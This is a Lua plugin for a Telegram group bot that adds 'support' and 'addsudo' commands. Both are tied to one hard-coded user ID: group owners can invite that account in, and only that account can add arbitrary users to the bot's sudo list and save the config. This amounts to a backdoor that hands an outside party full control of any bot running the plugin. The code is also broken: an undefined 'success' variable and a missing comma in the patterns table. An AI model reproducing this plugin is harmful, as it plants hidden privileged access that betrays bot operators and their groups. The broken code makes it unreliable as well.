local function callback(extra, success, result)
  vardump(success)
  vardump(result)
end

local function reload_plugins( )
  plugins = {}
  return load_plugins()
end

local function run(msg, matches)
  local user = 179071599

 if matches[1] == 'support' then
 if is_owner(msg) then
     user = 'user#id'..user
	   if msg.to.type == 'chat' then
	       local chat = 'chat#id'..msg.to.id
		       chat_add_user(chat, user, callback, false)
			   
 if success then
 reply_msg(msg.id, 'Sudo Has Been Added By User ['..msg.from.id..']('..msg.from.username..')', true)
 end
 
 if not success then
  reply_msg(msg.id, 'this is a bug ask Sudo in bot support', true)
	end
	
		elseif msg.to.type == 'channel' then
			local chat = 'channel#id'..msg.to.id
				channel_invite(chat, user, callback, false)
				
 if success then
 reply_msg(msg.id, 'Sudo Has Been Added By User ['..msg.from.id..']('..msg.from.username..')', true)
 end
 
 if not success then
 reply_msg(msg.id, 'this is a bug ask Sudo in bot support', true)
 end
 
 elseif msg.to.type == 'user' then
 return 
	end -- only for chat
	
	end -- only for owners
	

end

if matches[1] == 'addsudo' then
if msg.from.id and msg.from.id == tonumber(179071599) then
table.insert(_config.sudo_users,tonumber(matches[2]))
    print(matches[2]..' added to sudo users')
    save_config()
  reload_plugins(true)
  return "User "..matches[2].." added to sudo users"
  else
  return "error"
  end
  end


end

return {
  patterns = {
    "^[!/#]([Ss][Uu][Pp][Pp][Oo][Rr][Tt])$",
	"^[!/#]([Aa][Dd][Dd][Ss][Uu][Dd][Oo]) (.*)$"
  "^addsudo (.*)$"
  },
  run = run,
}
